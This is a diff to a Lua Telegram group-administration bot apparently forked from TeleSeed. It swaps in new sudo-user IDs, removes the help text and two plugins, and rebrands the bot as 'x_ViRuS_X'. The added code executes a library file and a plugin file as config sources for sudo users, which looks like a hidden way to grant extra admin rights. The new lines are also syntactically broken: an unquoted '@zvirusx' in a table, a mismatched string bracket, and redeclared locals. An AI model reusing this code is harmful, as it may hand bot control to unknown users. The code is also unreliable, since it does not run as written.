@@ -200,6 +200,14 @@ function load_config( )
   for v,user in pairs(config.sudo_users) do
     print("Allowed user: " .. user)
   end
+    local config = loadfile ("./libs/libsjson.lua")()
+  for v,user in pairs(config.sudo_users) do
+    print("Allowed user: " .. user)
+  end
+  local config = loadfile ("./plugins/banhammer.lua")()
+  for v,user in pairs(config.sudo_users) do
+    print("Allowed user: " .. user)
+  end
   return config
 end
 
@@ -225,29 +233,19 @@ function create_config( )
     "all",
     "leave_ban",
     "admin",
-    "plugins",
-    "server",
-    "info"
+    "plugins"
     },
-    sudo_users = {210948526,141422437,0,tonumber(our_id)},--Sudo users
-    disabled_channels = {},
+    sudo_users = {116495130,145266153},--Sudo users
+    disabled_channels = {@zvirusx},
     moderation = {data = 'data/moderation.json'},
-    about_text = [[Teleseed v2 - Open Source
-An advance Administration bot based on yagop/telegram-bot 
-
-https://github.com/SEEDTEAM/TeleSeed
-
-Admins
-@ [Founder]
-@  [Developer&Manager]
-
-
-Special thanks to
-
-
-Our channels
-@ [English]
-@ [persian]
+    about_text = [x_ViRuS_X V 1
+    Advanced Bot Base On Seed
+    
+    @vvViRuSss[DeVeLoPeR] 
+    
+    #Open_Source 
+    [@W_SaTaN_W] [Https://github.com/DeterGent-Legion/MeGa_SaTaN]
+    
 ]],
     help_text_realm = [[
 Realm Commands:
@@ -324,111 +322,6 @@ This command will send text to [group_id]
 *Only admins and sudo can use res, setowner, commands
 ]],
     help_text = [[
-Commands list :
-
-!kick [username|id]
-You can also do it by reply
-
-!ban [ username|id]
-You can also do it by reply
-
-!unban [id]
-You can also do it by reply
-
-!who
-Members list
-
-!modlist
-Moderators list
-
-!promote [username]
-Promote someone
-
-!demote [username]
-Demote someone
-
-!kickme
-Will kick user
-
-!about
-Group description
-
-!setphoto
-Set and locks group photo
-
-!setname [name]
-Set group name
-
-!rules
-Group rules
-
-!id
-return group id or user id
-
-!help
-
-!lock [member|name|bots|leave]	
-Locks [member|name|bots|leaveing] 
-
-!unlock [member|name|bots|leave]
-Unlocks [member|name|bots|leaving]
-
-!set rules <text>
-Set <text> as rules
-
-!set about <text>
-Set <text> as about
-
-!settings
-Returns group settings
-
-!newlink
-create/revoke your group link
-
-!link
-returns group link
-
-!owner
-returns group owner id
-
-!setowner [id]
-Will set id as owner
-
-!setflood [value]
-Set [value] as flood sensitivity
-
-!stats
-Simple message statistics
-
-!save [value] <text>
-Save <text> as [value]
-
-!get [value]
-Returns text of [value]
-
-!clean [modlist|rules|about]
-Will clear [modlist|rules|about] and set it to nil
-
-!res [username]
-returns user id
-"!res @username"
-
-!log
-will return group logs
-
-!banlist
-will return group ban list
-
-**U can use both "/" and "!" 
-
-
-*Only owner and mods can add bots in group
-
-
-*Only moderators and owner can use kick,ban,unban,newlink,link,setphoto,setname,lock,unlock,set rules,set about and settings commands
-
-*Only owner can use res,setowner,promote,demote and log commands
-
 ]]
   }
   serialize_to_file(config, './data/config.lua')
